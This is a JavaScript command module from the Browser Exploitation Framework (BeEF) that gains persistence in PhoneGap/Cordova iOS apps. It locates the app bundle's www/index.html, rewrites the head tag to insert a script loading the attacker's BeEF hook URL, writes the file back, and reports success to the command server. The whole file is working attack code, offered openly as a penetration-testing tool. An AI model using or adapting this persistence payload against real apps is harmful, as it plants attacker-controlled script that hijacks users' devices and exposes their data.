//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// persistence
//
beef.execute(function() {
   
    // insert hook into index.html
    //
    // 1. locate index.html
    // 2. read it in 
    // 3. add our hook
    // 4. write it back out to same location

    // 1. locate index.html
    // 
    // list dirs under current dir
    // one should be something.app
    // inside that should be a www dir and in that an index.html
    //

    // write the file with new hook
    function write_file(text) {

        function fail () {
            beef.debug('write_file fail')
        }

        function gotFileWriter(writer) {
            writer.onwrite = function(evt) {
                beef.debug("write success");
            }
            writer.write(text);
        }

        function gotFileEntry(fileEntry) {
            fileEntry.createWriter(gotFileWriter, fail);
        }

        function gotFS(fileSystem) {
            fileSystem.root.getFile("../"+window.tmpfilename+"/www/index.html", null, gotFileEntry, fail);
        }

      window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, gotFS, fail);
        
    }

    // find <head></head> and insert our hook.
    function replace_text(text) {
        re = new RegExp("<head>", "g");
        hook_url = '<%== @hook_url %>';
        new_text = text.replace(re, "<head><script src='" + hook_url + "'></script>")
        
        write_file(new_text);
    }

    function read_index(app_name) {
        function fail () {
            beef.debug('read_index fail')
        }
        
        function readFile(file) {
            var reader = new FileReader();
            reader.onloadend = function(evt) {
                //beef.debug("Read as text");
                beef.debug(evt.target.result);
                replace_text(evt.target.result);
            };
            reader.readAsText(file);    
        }
        
        function gotFileEntry(fileEntry) {
            fileEntry.file(readFile, fail);
        }

        function gotFS(fileSystem) {
            fileSystem.root.getFile("../"+app_name+"/www/index.html", null, gotFileEntry, fail);
        }

        window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, gotFS, fail);
    }

    function locate() {
 
        function result(entries) {
         beef.debug('result'); 
          var i;
          for (i=0; i<entries.length; i++) {
             // looking for <something>.app
             var re = new RegExp(/^[a-zA-Z0-9]*\.app/)
             var match = re.exec(entries[i].name)
             if (match) {
               beef.debug('found ' + entries[i].name);
               
               // look for ../<something>.app/www/index.html
               read_index(entries[i].name);
               
               // FIXME find a less hacky way
               // just wanted to make this global so I didnt have to call it again to write the file
               window.tmpfilename = entries[i].name;
             }
           }
        } 

     
      function fail() {
        beef.debug('fail');
      }

      function win(entries) {
        beef.debug('win');
        result(entries);
      }

      // use directoryentry to create directory reader
      function gotDirEntry(dirEntry) {
        var directoryReader = dirEntry.createReader();
        directoryReader.readEntries(win,fail);
      }

      // use getDirectoy to create reference to directoryentry 
      function gotFS(fileSystem) {
        // on iphone current dir defaults to <myname>.app/documents
        // so we wanna look in our parent directory for <something>.app
        fileSystem.root.getDirectory('../', null, gotDirEntry, fail);
      }

      window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, gotFS, fail);
    }


    //result = fail;
    //beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result);

    locate(); 
    result = 'success';
    beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result);

});
